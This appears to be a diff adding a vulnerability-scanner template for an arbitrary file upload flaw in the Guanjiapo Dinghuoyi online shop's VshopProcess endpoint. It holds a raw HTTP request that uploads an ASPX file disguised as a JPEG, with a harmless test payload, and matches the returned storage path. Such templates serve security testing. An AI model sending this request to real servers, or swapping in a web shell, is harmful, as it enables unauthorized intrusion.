@@ -1,0 +1,32 @@
+id: yizaixian-VshopProcess-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity:  critical
+  description: 管家婆订货易在线商城 VshopProcess 任意文件上传漏洞
+  reference:
+    - https://github.com/2784410357/wp/blob/284414fa7ecd0f906efe41c47ae54badc29a8551/%E7%AE%A1%E5%AE%B6%E5%A9%86%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E%20VshopProcess%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/gjp_VshopProcess.py#L43
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/57.0.578.100 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+        Content-Length: 211
+
+        ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+        Content-Disposition: form-data; name="fileup1i"; filename="a.aspx"
+        Content-Type: image/jpeg
+
+        <% Response.Write("Test"); %>
+        ------WebKitFormBoundarytCOFhbEjc3IfYaY5--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/Storage/UserFileImg/'
